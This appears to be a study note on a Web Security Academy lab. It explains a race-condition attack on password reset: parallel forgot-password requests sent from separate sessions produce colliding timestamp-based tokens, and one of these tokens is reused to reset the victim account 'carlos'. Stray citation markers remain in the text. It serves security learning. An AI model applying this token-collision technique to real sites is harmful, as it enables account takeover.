# Payload 06 – Time-Sensitive Password Reset

## Endpoint

```http
POST /forgot-password
```

---

## Basic Request

```http
POST /forgot-password HTTP/2
Host: YOUR-LAB-ID.web-security-academy.net
Cookie: session=YOUR-SESSION
Content-Type: application/x-www-form-urlencoded

username=wiener
```

---

## Core Concept

The password-reset token appears to depend partly on timing information.

Conceptually:

```text
Token = Hash(timestamp + other inputs)
```

If two requests execute within the same timestamp window:

```text
Request A → timestamp X → Token X
Request B → timestamp X → Token X
```

---

## Session-Locking Problem

If both requests use the same PHP session, they may be processed sequentially.

Use different sessions to avoid this.

Concept:

```text
Session A
    ↓
POST /forgot-password

Session B
    ↓
POST /forgot-password
```

Send them in parallel.

The source notes that matching response times can result in identical reset tokens. :contentReference[oaicite:10]{index=10}

---

## Targeting Carlos

One request:

```text
username=wiener
```

Other request:

```text
username=carlos
```

Attempt to make both requests execute during the same timestamp.

---

## Result

If the tokens collide:

```text
wiener → Token X
carlos → Token X
```

The source's lab procedure then changes the username in the reset URL to:

```text
carlos
```

and uses the shared token to reset the account. :contentReference[oaicite:11]{index=11}